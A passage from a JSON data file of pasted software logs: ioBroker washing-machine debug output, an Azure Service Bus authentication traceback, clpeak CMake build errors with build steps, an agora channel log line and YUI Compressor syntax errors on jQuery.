22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:56.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 1, Inhalt: [66.81]\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:12:56.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 2, Inhalt: [66.81,66.81]\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [ID] \"alias.0.Waschmaschine.POWER\"\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [PATH] {\"val\":68.72,\"ack\":true,\"ts\":1626289987645,\"q\":0,\"from\":\"system.adapter.hm-rpc.1\",\"user\":\"system.user.admin\",\"lc\":1626289987645}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}\r\n2021-07-14 21:13:07.655 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\r\n2021-07-14 21:13:16.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:16.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.45\r\n2021-07-14 21:13:16.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 3, Inhalt: [66.81,66.81,68.72]\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:16.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:16.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:16.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:26.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.77\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 4, Inhalt: [66.81,66.81,68.72,68.72]\r\n2021-07-14 21:13:26.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n[Truncated]\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:26.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:36.185 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:36.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:36.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 67.96\r\n2021-07-14 21:13:36.188 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 5, Inhalt: [66.81,66.81,68.72,68.72,68.72]\r\n2021-07-14 21:13:36.189 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:36.190 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:36.191 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START68.72; 30; false\r\n2021-07-14 21:13:36.193 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: value status: 1\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: in action (in action)\r\n2021-07-14 21:13:36.194 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Ger\u00e4t gestartet, device l\u00e4uft\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: GESTARTET\r\n2021-07-14 21:13:36.195 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.308 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: setVolume\r\n2021-07-14 21:13:36.309 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n"
    },
    {
        "logs": "`\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 246, in _do_retryable_operation\r\n    return await operation(**kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_servicebus_receiver_async.py\", line 317, in _open\r\n    await self._handler.open_async(connection=self._connection)\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 246, in open_async\r\n    await self._build_session_async()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 192, in _build_session_async\r\n    self._connection._cbs = await asyncio.shield(\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 279, in create_authenticator_async\r\n    await self.update_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 283, in update_token\r\n    access_token = await self.get_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/default.py\", line 129, in get_token\r\n    return await super().get_token(*scopes, **kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/chained.py\", line 80, in get_token\r\n    raise ClientAuthenticationError(message=message)\r\nazure.core.exceptions.ClientAuthenticationError: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/fastapi_utils/tasks.py\", line 64, in loop\r\n    await func()  # type: ignore\r\n  File \"/api/./main.py\", line 59, in update_deployment_status\r\n    await receive_message_and_update_deployment(app)\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 111, in receive_message_and_update_deployment\r\n    async for message in receive_message_gen:\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 41, in receive_message\r\n    async with receiver:\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 169, in __aenter__\r\n    await self._open_with_retry()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 370, in _open_with_retry\r\n    return await self._do_retryable_operation(self._open)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 250, in _do_retryable_operation\r\n    last_exception = await self._handle_exception(exception)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 198, in _handle_exception\r\n    raise error\r\nazure.servicebus.exceptions.ServiceBusError: Handler failed: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'.\r\n"
    },
    {
        "logs": "```\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 246, in _do_retryable_operation\r\n    return await operation(**kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_servicebus_receiver_async.py\", line 317, in _open\r\n    await self._handler.open_async(connection=self._connection)\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 246, in open_async\r\n    await self._build_session_async()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/async_ops/client_async.py\", line 192, in _build_session_async\r\n    self._connection._cbs = await asyncio.shield(\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 279, in create_authenticator_async\r\n    await self.update_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/uamqp/authentication/cbs_auth_async.py\", line 283, in update_token\r\n    access_token = await self.get_token()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/default.py\", line 129, in get_token\r\n    return await super().get_token(*scopes, **kwargs)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/identity/aio/_credentials/chained.py\", line 80, in get_token\r\n    raise ClientAuthenticationError(message=message)\r\nazure.core.exceptions.ClientAuthenticationError: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'\r\n\r\nDuring handling of the above exception, another exception occurred:\r\n\r\nTraceback (most recent call last):\r\n  File \"/usr/local/lib/python3.8/site-packages/fastapi_utils/tasks.py\", line 64, in loop\r\n    await func()  # type: ignore\r\n  File \"/api/./main.py\", line 59, in update_deployment_status\r\n    await receive_message_and_update_deployment(app)\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 111, in receive_message_and_update_deployment\r\n    async for message in receive_message_gen:\r\n  File \"/api/./service_bus/deployment_status_update.py\", line 41, in receive_message\r\n    async with receiver:\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 169, in __aenter__\r\n    await self._open_with_retry()\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 370, in _open_with_retry\r\n    return await self._do_retryable_operation(self._open)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 250, in _do_retryable_operation\r\n    last_exception = await self._handle_exception(exception)\r\n  File \"/usr/local/lib/python3.8/site-packages/azure/servicebus/aio/_base_handler_async.py\", line 198, in _handle_exception\r\n    raise error\r\nazure.servicebus.exceptions.ServiceBusError: Handler failed: DefaultAzureCredential failed to retrieve a token from the included credentials.\r\nAttempted credentials:\r\n\tEnvironmentCredential: EnvironmentCredential authentication unavailable. Environment variables are not fully configured.\r\n\tManagedIdentityCredential: [Errno 19] No such device: '/home/api_user/.netrc'.\r\n"
    },
    {
        "logs": "`\r\nroot@DUT2928-PVC:/home/gta/clpeak/build# cmake ..\r\n-- Setting build type to Release\r\nCMake Warning (dev) in CMakeLists.txt:\r\n  No project() command is present.  The top-level CMakeLists.txt file must\r\n  contain a literal, direct call to the project() command.  Add a line of\r\n  code such as\r\n\r\n  project(ProjectName)\r\n  near the top of the file, but after cmake_minimum_required().\r\n  CMake is pretending there is a \"project(Project)\" command on the first\r\n  line.\r\n\r\nThis warning is for project developers.  Use -Wno-dev to suppress it.\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build/clhpp/build\r\n[ 12%] Performing update step for 'hpp_headers'\r\nCurrent branch master is up to date.\r\n[ 25%] Performing configure step for 'hpp_headers'\r\nCMake Error at CMakeLists.txt:43 (find_package):\r\n\r\n  By not providing \"FindOpenCLHeaders.cmake\" in CMAKE_MODULE_PATH this\r\n  project has asked CMake to find a package configuration file provided by\r\n  \"OpenCLHeaders\", but CMake did not find one.\r\n  Could not find a package configuration file provided by \"OpenCLHeaders\"\r\n  with any of the following names:\r\n\r\n    OpenCLHeadersConfig.cmake\r\n    openclheaders-config.cmake\r\n\r\n \r\n  Add the installation prefix of \"OpenCLHeaders\" to CMAKE_PREFIX_PATH or set\r\n  \"OpenCLHeaders_DIR\" to a directory containing one of the above files.  If\r\n  \"OpenCLHeaders\" provides a separate development package or SDK, be sure it\r\n  has been installed.\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/gta/clpeak/build/clhpp/build/hpp/src/hpp_headers-build/CMakeFiles/CMakeOutput.log\".\r\nmake[2]: *** [CMakeFiles/hpp_headers.dir/build.make:107: hpp/src/hpp_headers-stamp/hpp_headers-configure] Error 1\r\nmake[1]: *** [CMakeFiles/Makefile2:76: CMakeFiles/hpp_headers.dir/all] Error 2\r\nmake: *** [Makefile:84: all] Error 2\r\n-- Selected OpenCL includes from /usr/include;/home/gta/clpeak/build/clhpp_install/include\r\n-- Selected OpenCL lib /usr/lib/x86_64-linux-gnu/libOpenCL.so\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build\r\nroot@DUT2928-PVC:/home/gta/clpeak/build#\r\n"
    },
    {
        "logs": "`\r\ngit clone https://github.com/username_1/clpeak\r\ncd clpeak\r\ngit submodule update --init --recursive --remote\r\ngit revert db42d30028bace27cda3c7d95f122a5c14743246 #this commit is related to cl.hpp to opencl.hpp change\r\nrm -rf build; mkdir build; cd build\r\ncmake ..\r\ncmake --build .\r\n"
    },
    {
        "logs": "```\r\nroot@DUT2928-PVC:/home/gta/clpeak/build# cmake ..\r\n-- Setting build type to Release\r\nCMake Warning (dev) in CMakeLists.txt:\r\n  No project() command is present.  The top-level CMakeLists.txt file must\r\n  contain a literal, direct call to the project() command.  Add a line of\r\n  code such as\r\n\r\n  project(ProjectName)\r\n  near the top of the file, but after cmake_minimum_required().\r\n  CMake is pretending there is a \"project(Project)\" command on the first\r\n  line.\r\n\r\nThis warning is for project developers.  Use -Wno-dev to suppress it.\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build/clhpp/build\r\n[ 12%] Performing update step for 'hpp_headers'\r\nCurrent branch master is up to date.\r\n[ 25%] Performing configure step for 'hpp_headers'\r\nCMake Error at CMakeLists.txt:43 (find_package):\r\n\r\n  By not providing \"FindOpenCLHeaders.cmake\" in CMAKE_MODULE_PATH this\r\n  project has asked CMake to find a package configuration file provided by\r\n  \"OpenCLHeaders\", but CMake did not find one.\r\n  Could not find a package configuration file provided by \"OpenCLHeaders\"\r\n  with any of the following names:\r\n\r\n    OpenCLHeadersConfig.cmake\r\n    openclheaders-config.cmake\r\n\r\n \r\n  Add the installation prefix of \"OpenCLHeaders\" to CMAKE_PREFIX_PATH or set\r\n  \"OpenCLHeaders_DIR\" to a directory containing one of the above files.  If\r\n  \"OpenCLHeaders\" provides a separate development package or SDK, be sure it\r\n  has been installed.\r\n\r\n-- Configuring incomplete, errors occurred!\r\nSee also \"/home/gta/clpeak/build/clhpp/build/hpp/src/hpp_headers-build/CMakeFiles/CMakeOutput.log\".\r\nmake[2]: *** [CMakeFiles/hpp_headers.dir/build.make:107: hpp/src/hpp_headers-stamp/hpp_headers-configure] Error 1\r\nmake[1]: *** [CMakeFiles/Makefile2:76: CMakeFiles/hpp_headers.dir/all] Error 2\r\nmake: *** [Makefile:84: all] Error 2\r\n-- Selected OpenCL includes from /usr/include;/home/gta/clpeak/build/clhpp_install/include\r\n-- Selected OpenCL lib /usr/lib/x86_64-linux-gnu/libOpenCL.so\r\n-- Configuring done\r\n-- Generating done\r\n-- Build files have been written to: /home/gta/clpeak/build\r\nroot@DUT2928-PVC:/home/gta/clpeak/build#\r\n"
    },
    {
        "logs": "```\r\ngit clone https://github.com/username_1/clpeak\r\ncd clpeak\r\ngit submodule update --init --recursive --remote\r\ngit revert db42d30028bace27cda3c7d95f122a5c14743246 #this commit is related to cl.hpp to opencl.hpp change\r\nrm -rf build; mkdir build; cd build\r\ncmake ..\r\ncmake --build .\r\n"
    },
    {
        "logs": "`2022-01-28T02:49:34.7716990Z 2022-01-28 02:49:32,15 \u001b[32mInfo\u001b[0m [agora.flash.Channel] - Alice: Publishing update tx 4: 0x5fdc75. Result: { status: Status.Rejected, reason: \"Double spend comes with a less-than-acceptable fee increase\" }"
    },
    {
        "logs": "`\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8239:27:missing name after . operator\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8240:17:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:7:missing ) after argument list\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8259:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8262:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8265:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8266:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8268:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8269:7:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8270:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8271:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8272:10:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8273:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8274:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8275:15:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8288:11:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8289:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8290:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8291:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8292:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8293:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8294:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8296:12:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:8:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:11:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8297:16:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8298:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:9:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:12:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:illegal character\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8299:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8300:4:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8302:18:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  8303:8:syntax error\r\n[Truncated]\n  8791:3:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9830:7:invalid return\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  9831:1:syntax error\r\n[ERROR] in /Users/username_0/Downloads/jquery-2.2.0.js\r\n  1:0:Compilation produced 71 syntax errors.\r\norg.mozilla.javascript.EvaluatorException: Compilation produced 71 syntax errors.\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor$1.runtimeError(YUICompressor.java:172)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:396)\r\n\tat org.mozilla.javascript.Parser.parse(Parser.java:340)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.parse(JavaScriptCompressor.java:315)\r\n\tat com.yahoo.platform.yui.compressor.JavaScriptCompressor.<init>(JavaScriptCompressor.java:536)\r\n\tat com.yahoo.platform.yui.compressor.YUICompressor.main(YUICompressor.java:147)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)\r\n\tat sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)\r\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\r\n\tat java.lang.reflect.Method.invoke(Method.java:497)\r\n\tat com.yahoo.platform.yui.compressor.Bootstrap.main(Bootstrap.java:21)\r\n"
    },
    {
